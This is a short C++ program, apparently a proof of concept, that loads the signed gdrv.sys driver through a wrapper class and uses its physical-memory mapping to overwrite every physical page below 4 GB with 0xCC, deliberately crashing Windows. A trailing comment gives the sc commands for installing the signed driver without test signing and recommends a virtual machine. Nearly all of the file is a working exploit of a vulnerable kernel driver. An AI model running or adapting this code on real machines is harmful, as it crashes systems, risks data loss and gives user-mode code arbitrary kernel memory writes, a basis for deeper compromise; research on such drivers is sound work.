#include "simplegdrv.hpp"
#include <memory>

int main()
{
	const auto gdrv = std::make_unique<simplegdrv>();

	//example taken from secure auth writeup on gdrv

	std::cout << "press enter to bsod" << std::endl;
	std::getchar();


	for (unsigned int i = 0; i < 0xffffffff; i += 0x1000)
	{
		const ULONG64 mappedVA = gdrv->map_physical(i, 0x1000);
		*reinterpret_cast<ULONG64*>(mappedVA) = 0xCCCCCCCCCCCCCCCC;
		gdrv->unmap_physical(i);
	}
}
///
/*
* Load the gdrv.sys driver, testsigning does not need to be enabled since this is a signed driver
* $ sc create gdrv binPath= path_to_gdrv.sys type= kernel
* $ sc start gdrv
* You can now use the example, I reccomend using some form of virtualization when experimenting with this.
* 
*/
